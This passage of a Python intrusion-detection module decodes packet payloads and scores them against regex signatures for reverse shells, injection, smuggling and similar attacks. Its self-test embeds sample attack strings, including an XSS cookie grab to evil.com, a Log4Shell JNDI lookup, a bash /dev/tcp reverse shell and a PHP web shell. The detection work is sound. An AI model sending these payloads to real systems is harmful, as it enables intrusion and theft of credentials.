        "gzip magic b64":     (r"H4sI[A-Za-z0-9+/=]{20,}",          30),
    }
    EXFIL_MIN_SIZE = 100_000  # 100 KB payload = potential exfil

    # ── Encoding Evasion ───────────────────────────────────────────
    ENCODING = {
        "URL double encode":  (r"%25[0-9a-f]{2}",                    30),
        "Unicode fullwidth":  (r"[\uff01-\uff5e]",                   30),
        "HTML entity xss":    (r"&(?:lt|gt|quot|amp|#\d{2,4}|#x[0-9a-f]{2,4});.*(?:script|on\w+=)", 35),
        "URL encoded script": (r"%3c\s*script|%3cscript",            40),
        "Null byte inject":   (None,                                  35),  # byte check
        "overlong UTF-8":     (r"(?:%c0%[0-9a-f]{2}|%e0%80)",       35),
        "backslash escape":   (r"\\x[0-9a-f]{2}\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}", 25),
        "charset confusion":  (r"charset\s*=\s*(?:utf-7|ibm037|cp037)", 30),
    }

    # ── Reverse Shell ──────────────────────────────────────────────
    REVSHELL = {
        "bash tcp redirect":  (r"bash\s+-i\s+>&\s+/dev/tcp/",        60),
        "bash tcp sh":        (r"/dev/tcp/[0-9]{1,3}\.[0-9.]+/\d+", 55),
        "nc reverse":         (r"\bnc\b.*?-[eE]\s+(?:/bin/bash|/bin/sh|cmd)", 55),
        "ncat reverse":       (r"\bncat\b.*?--sh-exec",              55),
        "python socket":      (r"socket\.connect\(['\"].*?'\s*,\s*\d{2,5}\s*\)", 50),
        "perl reverse":       (r"use\s+Socket.*?connect\(.*?PeerAddr", 50),
        "ruby reverse":       (r"TCPSocket\.new\(['\"].*?['\"],\s*\d+\)", 50),
        "php fsockopen":      (r"fsockopen\s*\(['\"].*?['\"],\s*\d+", 50),
        "powershell tcp":     (r"Net\.Sockets\.TCPClient\(['\"].*?['\"],\s*\d+", 50),
        "golang reverse":     (r"net\.Dial\(['\"]tcp['\"],\s*['\"].*?:\d+", 45),
        "Meterpreter stager": (r"meterpreter|metsrv\.dll|msfpayload", 55),
        "telnet pipe":        (r"telnet\s+\d+\.\d+\.\d+\.\d+\s+\d+\s*\|\s*/bin/(?:bash|sh)", 55),
        "socat reverse":      (r"socat\s+.*?EXEC:/bin/(?:bash|sh)",  55),
    }

    # ── Protocol Anomaly ──────────────────────────────────────────
    PROTOCOL = {
        "HTTP smuggling CL-TE":(r"Content-Length:\s*\d+.*?Transfer-Encoding:\s*chunked", 45),
        "HTTP smuggling TE-CL":(r"Transfer-Encoding:\s*chunked.*?Content-Length:\s*\d+", 40),
        "CRLF injection":     (r"%0[dD]%0[aA](?:Set-Cookie|Location|Content-Type):", 45),
        "CRLF header inject": (r"\r\n(?:Set-Cookie|Location|Content-Type):",          45),
        "Host header SSRF":   (r"^Host:\s*(?:localhost|127\.|169\.254\.|10\.|192\.168\.)", 35),
        "X-Forwarded-Host":   (r"X-Forwarded-Host:\s*(?:localhost|127\.|169\.254\.)", 35),
        "chunked TE trick":   (r"Transfer-Encoding:\s*(?:xchunked|chunked\s*,|identity\s*,)", 40),
        "method override":    (r"X-HTTP-Method-Override:\s*(?:PUT|DELETE|PATCH)",     20),
        "request tunnel":     (r"CONNECT\s+\d+\.\d+\.\d+\.\d+:\d+\s+HTTP",           35),
        "open redirect":      (r"(?:redirect|url|next|return|redir)=https?://(?!(?:localhost))\S+", 25),
    }


# ═══════════════════════════════════════════════════════════════════
#  SECTION 3 — PAYLOAD EXTRACTOR
#  Normalises, decodes, and prepares payload for matching
# ═══════════════════════════════════════════════════════════════════

class PayloadExtractor:
    """Extracts, decodes and prepares payload bytes for analysis."""

    MAX_PAYLOAD_BYTES = 65_536   # Only inspect first 64 KB

    def extract(self, packet_info: dict) -> dict:
        """
        Return a dict of decoded payload representations:
          raw      : bytes  — original payload bytes
          text     : str    — UTF-8 decoded (errors=ignore)
          url_dec  : str    — URL-decoded text
          b64_dec  : bytes  — base64-decoded (if looks like b64)
          hex_dec  : bytes  — hex-decoded (if looks like hex)
          size     : int    — raw byte count
          src_port : int
          dst_port : int
          protocol : str
          src      : str
          dst      : str
        """
        raw: bytes = packet_info.get("payload", b"") or b""
        raw = raw[:self.MAX_PAYLOAD_BYTES]

        text = raw.decode("utf-8", errors="ignore")
        text_lower = text.lower()

        # URL decode (handles %xx and + for space)
        try:
            url_dec = unquote_plus(text)
        except Exception:
            url_dec = text

        # Base64 decode attempt
        b64_dec = b""
        try:
            candidate = re.sub(r"[^A-Za-z0-9+/=]", "", text)
            if len(candidate) > 40 and len(candidate) % 4 == 0:
                b64_dec = base64.b64decode(candidate)
        except Exception:
            pass

        # Hex decode attempt
        hex_dec = b""
        try:
            hex_candidate = re.sub(r"[^0-9a-fA-F]", "", text)
            if len(hex_candidate) > 40 and len(hex_candidate) % 2 == 0:
                hex_dec = bytes.fromhex(hex_candidate)
        except Exception:
            pass

        return {
            "raw":      raw,
            "text":     text,
            "text_low": text_lower,
            "url_dec":  url_dec,
            "b64_dec":  b64_dec,
            "hex_dec":  hex_dec,
            "size":     len(raw),
            "src":      packet_info.get("src", ""),
            "dst":      packet_info.get("dst", ""),
            "src_port": packet_info.get("src_port", 0) or 0,
            "dst_port": packet_info.get("dst_port", 0) or 0,
            "protocol": packet_info.get("protocol", ""),
            "flags":    packet_info.get("flags", ""),
        }

    @staticmethod
    def excerpt(text: str, max_len: int = 120) -> str:
        """Return a safe excerpt of matched text for logging."""
        clean = text.replace("\r", "\\r").replace("\n", "\\n")
        return clean[:max_len] + ("…" if len(clean) > max_len else "")


# ═══════════════════════════════════════════════════════════════════
#  SECTION 4 — INDIVIDUAL CATEGORY DETECTORS
# ═══════════════════════════════════════════════════════════════════

def _regex_score(representations: list, pattern_dict: dict) -> Tuple[float, List[str]]:
    """
    Score a payload against a pattern dict.
    representations: list of strings to search (text, url_dec, etc.)
    pattern_dict: {name: (regex_str, base_score)}
    Returns (confidence 0-100, list of matched pattern names)
    """
    total = 0.0
    matched = []
    for name, (pattern, score) in pattern_dict.items():
        if pattern is None:
            continue
        for rep in representations:
            try:
                if re.search(pattern, rep, re.IGNORECASE | re.DOTALL):
                    total += score
                    matched.append(name)
                    break   # count once per pattern across representations
            except Exception:
                pass
    confidence = min(100.0, total)
    return confidence, matched


def detect_sql_injection(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"],
            ex.get("b64_dec", b"").decode("utf-8", errors="ignore")]
    return _regex_score(reps, _Signatures.SQL)


def detect_xss(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"]]
    return _regex_score(reps, _Signatures.XSS)


def detect_command_injection(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"],
            ex.get("b64_dec", b"").decode("utf-8", errors="ignore")]
    return _regex_score(reps, _Signatures.CMD)


def detect_path_traversal(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"]]
    return _regex_score(reps, _Signatures.PATH)


def detect_file_upload(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"]]
    return _regex_score(reps, _Signatures.UPLOAD)


def detect_xml_xxe(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"]]
    return _regex_score(reps, _Signatures.XML)


def detect_ldap_injection(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"]]
    return _regex_score(reps, _Signatures.LDAP)


def detect_ssti(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"]]
    return _regex_score(reps, _Signatures.SSTI)


def detect_deserialization(ex: dict) -> Tuple[float, List[str]]:
    """Check magic bytes + regex patterns."""
    raw: bytes = ex["raw"]
    matched = []
    score = 0.0

    # Magic byte scan
    for magic, label in _Signatures.DESER_MAGIC_BYTES:
        if raw[:len(magic)] == magic or magic in raw[:512]:
            matched.append(label)
            score += 50.0
            break

    # Regex patterns on text representations
    reps = [ex["text"],
            ex.get("b64_dec", b"").decode("utf-8", errors="ignore")]
    s2, m2 = _regex_score(reps, _Signatures.DESER_PATTERNS)
    score += s2
    matched.extend(m2)

    return min(100.0, score), matched


def detect_log4shell(ex: dict) -> Tuple[float, List[str]]:
    """Log4Shell is so dangerous it gets its own multi-layer detector."""
    reps = [ex["text"], ex["url_dec"],
            ex.get("b64_dec", b"").decode("utf-8", errors="ignore"),
            # Also check HTTP headers which live in the text payload
            ]
    s, m = _regex_score(reps, _Signatures.LOG4SHELL)
    # Log4Shell is so critical: any single match = high confidence
    if m:
        s = max(s, 70.0)
    return s, m


def detect_shellcode(ex: dict) -> Tuple[float, List[str]]:
    """Detect raw shellcode via NOP sleds and x86 patterns."""
    raw: bytes = ex["raw"]
    matched = []
    score = 0.0

    # NOP sled detection in raw bytes
    for sled in _Signatures.SHELLCODE_NOP_SLEDS:
        if sled in raw:
            matched.append("NOP sled (0x90)")
            score += 40.0
            break

    # High entropy detection (shellcode is random-looking)
    if len(raw) > 64:
        byte_counts = [0] * 256
        for b in raw[:256]:
            byte_counts[b] += 1
        entropy = -sum((c/256) * (c/256).bit_length()
                       for c in byte_counts if c > 0)
        if entropy > 6.5:      # high entropy = likely encrypted/shellcode
            matched.append("high entropy payload")
            score += 20.0

    # Regex on hex representation
    hex_text = raw.hex()
    reps_hex = [hex_text]
    s2, m2 = _regex_score(reps_hex, _Signatures.SHELLCODE_PATTERNS)
    score += s2 * 0.5   # Scale down — hex patterns less precise
    matched.extend(m2)

    return min(100.0, score), matched


def detect_malware_transfer(ex: dict) -> Tuple[float, List[str]]:
    """Detect PE/ELF/Mach-O binaries and malicious scripts."""
    raw: bytes = ex["raw"]
    matched = []
    score = 0.0

    # Magic byte check
    for magic, label in _Signatures.BINARY_MAGIC:
        if raw[:len(magic)] == magic:
            matched.append(label)
            score += 60.0
            break
        # Also check if magic appears within first 512 bytes
        # (e.g. embedded PE in another container)
        if magic in raw[:512] and len(magic) >= 4:
            matched.append(f"embedded: {label}")
            score += 45.0
            break

    # Script pattern detection
    reps = [ex["text"], ex["url_dec"]]
    s2, m2 = _regex_score(reps, _Signatures.SCRIPT_PATTERNS)
    score += s2
    matched.extend(m2)

    return min(100.0, score), matched


def detect_credential_exposure(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"]]
    return _regex_score(reps, _Signatures.CRED)


def detect_data_exfiltration(ex: dict) -> Tuple[float, List[str]]:
    matched = []
    score = 0.0

    # Size-based detection
    if ex["size"] >= _Signatures.EXFIL_MIN_SIZE:
        matched.append(f"large payload ({ex['size']//1024} KB)")
        score += 30.0

    # Pattern-based detection
    reps = [ex["text"]]
    s2, m2 = _regex_score(reps, _Signatures.EXFIL)
    score += s2
    matched.extend(m2)

    return min(100.0, score), matched


def detect_encoding_evasion(ex: dict) -> Tuple[float, List[str]]:
    raw: bytes = ex["raw"]
    matched = []
    score = 0.0

    # Null byte check
    if b"\x00" in raw[:512]:
        matched.append("null byte injection")
        score += 35.0

    # Regex patterns
    reps = [ex["text"]]
    s2, m2 = _regex_score(reps, _Signatures.ENCODING)
    score += s2
    matched.extend(m2)

    return min(100.0, score), matched


def detect_reverse_shell(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"], ex["url_dec"],
            ex.get("b64_dec", b"").decode("utf-8", errors="ignore")]
    return _regex_score(reps, _Signatures.REVSHELL)


def detect_protocol_anomaly(ex: dict) -> Tuple[float, List[str]]:
    reps = [ex["text"]]
    return _regex_score(reps, _Signatures.PROTOCOL)


# ═══════════════════════════════════════════════════════════════════
#  SECTION 5 — MAIN PAYLOAD ENGINE
# ═══════════════════════════════════════════════════════════════════

# Map category key → (display name, detector function, min_confidence)
_DETECTOR_MAP = [
    ("SQL_INJECTION",      "SQL Injection",           detect_sql_injection,        20.0),
    ("XSS",                "XSS Attack",              detect_xss,                  20.0),
    ("COMMAND_INJECTION",  "Command Injection",        detect_command_injection,    20.0),
    ("PATH_TRAVERSAL",     "Path Traversal",           detect_path_traversal,       25.0),
    ("FILE_UPLOAD_ATTACK", "File Upload Attack",       detect_file_upload,          30.0),
    ("XML_XXE",            "XML XXE Injection",        detect_xml_xxe,              25.0),
    ("LDAP_INJECTION",     "LDAP Injection",           detect_ldap_injection,       25.0),
    ("SSTI",               "SSTI Attack",              detect_ssti,                 25.0),
    ("DESERIALIZATION",    "Deserialization Attack",   detect_deserialization,      30.0),
    ("LOG4SHELL",          "Log4Shell (CVE-2021-44228)", detect_log4shell,          15.0),  # lower threshold — critical
    ("SHELLCODE",          "Shellcode Payload",        detect_shellcode,            35.0),
    ("MALWARE_TRANSFER",   "Malware/Binary Transfer",  detect_malware_transfer,     40.0),
    ("CREDENTIAL_EXPOSURE","Credential Exposure",      detect_credential_exposure,  20.0),
    ("DATA_EXFILTRATION",  "Data Exfiltration",        detect_data_exfiltration,    20.0),
    ("ENCODING_EVASION",   "Encoding Evasion",         detect_encoding_evasion,     25.0),
    ("REVERSE_SHELL",      "Reverse Shell Payload",    detect_reverse_shell,        25.0),
    ("PROTOCOL_ANOMALY",   "Protocol Anomaly",         detect_protocol_anomaly,     25.0),
]


class PayloadEngine:
    """
    Main payload detection engine.

    Usage (from detection.py DetectionEngine):

        # In __init__:
        from payload_engine import PayloadEngine
        self.payload_engine = PayloadEngine()

        # In process_packet:
        payload_alerts = self.payload_engine.analyze(packet_info)
        alerts.extend(payload_alerts)

    The analyze() method returns a list of alert dicts in the exact
    same format used by detection.py and alert.py.
    """

    def __init__(self, min_confidence: float = 20.0,
                 cooldown_seconds: int = 30):
        """
        Args:
            min_confidence: Global minimum confidence to generate an alert (0-100).
            cooldown_seconds: Seconds before the same alert type fires again
                              for the same source IP.
        """
        self.min_confidence  = min_confidence
        self.cooldown        = cooldown_seconds
        self._extractor      = PayloadExtractor()
        self._alert_cache: Dict[str, float] = {}   # key → last_fire_time
        self._stats          = defaultdict(int)
        self._packet_count   = 0
        logger.info("[PayloadEngine] Initialized — 17 categories, %d detectors",
                    len(_DETECTOR_MAP))

    # ─────────────────────────────────────────────────────────────────
    #  PUBLIC API
    # ─────────────────────────────────────────────────────────────────

    def analyze(self, packet_info: dict) -> List[dict]:
        """
        Analyze a normalized packet dict for payload-based attacks.

        Args:
            packet_info: Dict from normalization.py with keys:
                src, dst, protocol, flags, src_port, dst_port,
                payload (bytes), timestamp, size.

        Returns:
            List of alert dicts compatible with existing NIDS alert format.
        """
        self._packet_count += 1

        # Skip packets with no payload — nothing to inspect
        payload: bytes = packet_info.get("payload") or b""
        if not payload:
            return []

        # Extract + decode payload into all representations
        ex = self._extractor.extract(packet_info)

        alerts = []
        for cat_key, display_name, detector_fn, min_conf in _DETECTOR_MAP:
            try:
                confidence, matched_patterns = detector_fn(ex)
            except Exception as exc:
                logger.debug("[PayloadEngine] Detector %s error: %s", cat_key, exc)
                continue

            # Global + per-detector minimum confidence gate
            effective_min = max(self.min_confidence, min_conf)
            if confidence < effective_min:
                continue

            # Cooldown deduplication per (category, src_ip)
            cache_key = f"{cat_key}:{ex['src']}"
            now = time.time()
            if now - self._alert_cache.get(cache_key, 0) < self.cooldown:
                continue
            self._alert_cache[cache_key] = now

            # Build compatible alert dict
            cat_meta = PAYLOAD_CATEGORIES.get(cat_key, {})
            severity = cat_meta.get("severity", "MEDIUM")

            alert = {
                # Core fields — same as detection.py alert format
                "type":           display_name,
                "rule_name":      display_name,
                "severity":       severity,
                "source":         ex["src"],
                "src":            ex["src"],
                "target":         ex["dst"],
                "dst":            ex["dst"],
                "src_port":       ex["src_port"],
                "dst_port":       ex["dst_port"],
                "protocol":       ex["protocol"],
                "timestamp":      packet_info.get("timestamp", now),
                "packet_count":   1,

                # Payload-specific fields
                "layer":          "Payload",
                "category":       cat_key,
                "confidence":     round(confidence, 1),
                "payload_size":   ex["size"],
                "payload_excerpt": PayloadExtractor.excerpt(ex["text"]),
                "matched_patterns": matched_patterns,

                # GUI compatibility
                "dos_val":  0,
                "ddos_val": 0,
            }

            alerts.append(alert)
            self._stats[display_name] += 1

            logger.warning(
                "[PAYLOAD ALERT] %s | Confidence: %.0f%% | "
                "Severity: %s | %s:%d → %s:%d | "
                "Patterns: %s",
                display_name, confidence, severity,
                ex["src"], ex["src_port"],
                ex["dst"], ex["dst_port"],
                matched_patterns[:3],
            )

        return alerts

    def get_stats(self) -> dict:
        """Return detection statistics."""
        return {
            "packets_analyzed": self._packet_count,
            "total_alerts":     sum(self._stats.values()),
            "by_category":      dict(self._stats),
            "min_confidence":   self.min_confidence,
            "cooldown_seconds": self.cooldown,
        }

    def set_min_confidence(self, value: float):
        """Adjust global minimum confidence threshold (0–100)."""
        self.min_confidence = max(0.0, min(100.0, value))
        logger.info("[PayloadEngine] min_confidence set to %.0f%%", self.min_confidence)

    def get_category_info(self, category_key: str) -> Optional[dict]:
        """Return full documentation for a payload category."""
        return PAYLOAD_CATEGORIES.get(category_key)

    def list_categories(self) -> List[str]:
        """Return list of all supported payload category keys."""
        return list(PAYLOAD_CATEGORIES.keys())


# ═══════════════════════════════════════════════════════════════════
#  SECTION 6 — DETECTION.PY INTEGRATION PATCH
#  Apply these two edits to detection.py to wire in the engine
# ═══════════════════════════════════════════════════════════════════

INTEGRATION_INSTRUCTIONS = """
HOW TO INTEGRATE payload_engine.py INTO detection.py
=====================================================

STEP 1 — In DetectionEngine.__init__(), add after the existing init code:

    from payload_engine import PayloadEngine
    self.payload_engine = PayloadEngine(
        min_confidence=20.0,
        cooldown_seconds=self.config.ALERT_COOLDOWN
    )

STEP 2 — In DetectionEngine.process_packet(), add after the existing
         raw_alerts = self.advanced_detector.detect_attack(packet_dict) call:

    # Payload analysis — runs on every packet that has a payload
    payload_alerts = self.payload_engine.analyze(packet_info)
    for pa in payload_alerts:
        if not self._should_alert(pa):
            continue
        alerts.append(pa)

STEP 3 — In DetectionEngine.get_statistics(), merge payload stats:

    payload_stats = self.payload_engine.get_stats()
    stats["payload_detections"] = payload_stats["by_category"]
    stats["payload_packets_analyzed"] = payload_stats["packets_analyzed"]

That is all. No other changes needed.
"""


# ═══════════════════════════════════════════════════════════════════
#  SECTION 7 — SELF-TEST
# ═══════════════════════════════════════════════════════════════════

def _run_self_test():
    """Run a self-test with synthetic payloads for all 17 categories."""

    engine = PayloadEngine(min_confidence=15.0, cooldown_seconds=0)

    test_cases = [
        # (label, dst_port, payload_bytes)
        ("SQL Injection",
         80,
         b"GET /login?user=' UNION SELECT username,password FROM users-- HTTP/1.1\r\n"),

        ("XSS",
         80,
         b"GET /search?q=<script>document.location='http://evil.com/c='+document.cookie</script> HTTP/1.1\r\n"),

        ("Command Injection",
         80,
         b"POST /ping HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1;cat /etc/passwd"),

        ("Path Traversal",
         80,
         b"GET /download?file=../../../../etc/passwd HTTP/1.1\r\n"),

        ("File Upload (PHP shell)",
         80,
         b"POST /upload HTTP/1.1\r\n\r\n<?php system($_GET['cmd']); ?>"),

        ("XXE Injection",
         80,
         b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'),

        ("LDAP Injection",
         389,
         b"user=admin*)(%26(objectClass=*)\x00&pass=anything"),

        ("SSTI Jinja2",
         80,
         b"GET /render?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1\r\n"),

        ("Java Deserialization",
         8080,
         b"\xac\xed\x00\x05sr\x00\x12java.lang.Runtime"),

        ("Log4Shell",
         8080,
         b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil.com/exploit}\r\n"),

        ("Shellcode NOP sled",
         445,
         b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x14\x31\xc0\x50"),

        ("Malware PE transfer",
         80,
         b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"),

        ("Credential Exposure",
         80,
         b"GET /api/data HTTP/1.1\r\nAuthorization: Basic dXNlcjpteVN1cGVyU2VjcmV0UGFzc3dvcmQ=\r\nX-AWS-Key: AKIAIOSFODNN7EXAMPLE\r\n"),

        ("Data Exfiltration",
         53,
         b"dXNlcjpwYXNzd29yZA==" + b"A" * 300),

        ("Encoding Evasion",
         80,
         b"GET /page?input=%253cscript%253ealert(1)%253c/script%253e HTTP/1.1\r\n"),

        ("Reverse Shell",
         80,
         b"POST /exec HTTP/1.1\r\n\r\ncmd=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"),

        ("Protocol Anomaly (HTTP Smuggling)",
         80,
         b"POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n"),
    ]

    print("\n" + "═" * 70)
    print("  PAYLOAD ENGINE SELF-TEST — 17 Categories")
    print("═" * 70)
    print(f"  {'Test Case':<35} {'Result':<12} {'Confidence':>10}  {'Patterns'}")
    print("  " + "─" * 66)

    passed = 0
    for label, dst_port, payload in test_cases:
        packet_info = {
            "src":      "10.0.0.50",
            "dst":      "192.168.1.100",
            "protocol": "TCP",
            "flags":    "PA",
            "src_port": 54321,
            "dst_port": dst_port,
            "payload":  payload,
            "size":     len(payload),
            "timestamp": time.time(),
        }
        alerts = engine.analyze(packet_info)
        if alerts:
            best = max(alerts, key=lambda a: a["confidence"])
            status = "✅ DETECTED"
            conf   = f"{best['confidence']:.0f}%"
            pats   = ", ".join(best["matched_patterns"][:2])
            passed += 1
        else:
            status = "❌ MISSED"
            conf   = "—"
            pats   = ""

        print(f"  {label:<35} {status:<12} {conf:>10}  {pats[:40]}")

    print("  " + "─" * 66)
    pct = 100 * passed // len(test_cases)
    print(f"  Result: {passed}/{len(test_cases)} detected  ({pct}%)")
    print("═" * 70 + "\n")

    # Print category reference
    print("  PAYLOAD CATEGORIES REFERENCE")
    print("  " + "─" * 66)
    for key, meta in PAYLOAD_CATEGORIES.items():
        print(f"  {key:<30} [{meta['severity']:^8}]")
        print(f"    {meta['description'][:80]}...")
        print()


if __name__ == "__main__":
    _run_self_test()
    print(INTEGRATION_INSTRUCTIONS)
